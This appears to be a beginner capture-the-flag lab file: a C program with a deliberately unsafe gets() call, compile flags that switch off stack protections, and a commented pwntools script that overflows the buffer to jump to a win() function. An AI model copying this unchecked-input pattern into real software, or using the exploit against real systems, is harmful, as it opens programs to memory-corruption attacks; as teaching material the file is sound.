// Buffer Overflow 101 - Source Code
// Compile: gcc -fno-stack-protector -z execstack -no-pie -o vuln buffer_overflow.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() {
    printf("Congratulations! You redirected execution!\n");
    printf("Flag: WOW{buff3r_0v3rfl0w}\n");
    // In real CTF: system("cat /flag.txt");
}

void vulnerable() {
    char buffer[64];
    printf("Enter your name: ");
    gets(buffer);  // VULNERABLE! No bounds checking
    printf("Hello, %s!\n", buffer);
}

int main() {
    printf("=== Buffer Overflow 101 ===\n");
    printf("win() is at address: %p\n", win);
    vulnerable();
    return 0;
}

/*
Exploit:
1. Find offset to return address (72 bytes on 64-bit)
2. Overwrite with address of win()

Python exploit:
from pwn import *
p = process('./vuln')
payload = b'A' * 72 + p64(0x401156)  # Replace with actual win() address
p.sendline(payload)
p.interactive()
*/
